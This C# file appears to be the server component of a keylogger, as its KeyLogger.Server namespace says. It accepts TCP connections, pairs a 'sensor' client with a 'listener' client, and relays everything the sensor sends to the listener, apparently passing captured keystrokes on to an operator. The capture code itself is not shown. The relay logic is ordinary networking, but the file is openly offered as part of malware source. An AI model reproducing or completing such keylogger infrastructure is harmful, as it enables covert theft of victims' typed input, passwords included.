using System;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace KeyLogger.Server
{
    class Program
    {
        static void Main(string[] args)
        {
            SensorClient sensor = null;
            ListenerClient listener = null;
            var tasks = new List<Task>();

            int port = 10000;
            if (args.Length > 0)
                int.TryParse(args[0], out port);
            Console.WriteLine($"Starting server on port {port}");
            
            var server = new TcpListener(IPAddress.Any, port);
            server.Start();

            var factory = new ClientFactory();

            while (sensor is null || listener is null)
            {
                Console.Write("Waiting for a client... ");
                var tcpClient = server.AcceptTcpClient();
                try
                {
                    
                    var message = new ClientConnectionMessage();
                    message.Receive(tcpClient.GetStream());
                    var client = factory.CreateClient(tcpClient, message.Type.Value);
                    Console.WriteLine($"connected: {client.ToString()}");
                    if (client is ListenerClient)
                        listener = (ListenerClient)client;
                    else if (client is SensorClient)
                    {
                        sensor = (SensorClient)client;
                        sensor.DataReceived += (s, e) =>
                        {
                            listener?.Send(e.Data);
                        };
                    }
                    tasks.Add(client.Run());
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("invalid type.");
                }
                catch (TimeoutException)
                {
                    Console.WriteLine("timeout.");
                }
            }

            Task.WaitAll(tasks.ToArray());
        }
    }
}
